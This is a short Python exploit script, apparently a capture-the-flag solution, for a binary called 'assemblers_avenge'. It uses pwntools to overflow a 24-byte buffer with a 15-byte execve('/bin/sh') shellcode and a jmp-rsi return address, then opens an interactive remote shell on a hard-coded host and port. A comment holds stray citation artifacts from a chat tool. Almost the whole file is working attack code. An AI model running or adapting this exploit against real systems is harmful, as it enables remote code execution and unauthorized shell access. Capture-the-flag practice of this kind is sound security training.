#!/usr/bin/env python3
from pwn import *

context.arch     = 'amd64'
context.log_level= 'info'

HOST, PORT      = '83.136.255.10', 42107
elf             = ELF('./assemblers_avenge')

jmp_rsi         = 0x40106b
binsh           = next(elf.search(b'/bin/sh\x00'))

# build a *15‑byte* execve("/bin/sh", 0, 0) stub
# this is exactly the "0x0f‑byte" stager from the PDF :contentReference[oaicite:1]{index=1}&#8203;:contentReference[oaicite:2]{index=2}
sc = asm(f'''
    xor    rsi, rsi
    xor    rdx, rdx
    mov    al, 0x3b
    mov    edi, {binsh}
    syscall
''')

# now pack it into the 24‑byte window:
#
#  0x00: start of buffer (rbp-8) → your shellcode must begin here
#  ...
#  0x0f: end of your 15‑byte sc
#  0x10: overwrite saved RIP with jmp_rsi
#
payload  = sc
payload += b'A' * (16 - len(sc))   # pad out to offset 16
payload += p64(jmp_rsi)            # goes into saved RIP (bytes 16–23)

assert len(payload) == 0x18        # exactly the 24‑byte read size

# fire off
p = remote(HOST, PORT)
p.send(payload)
p.interactive()
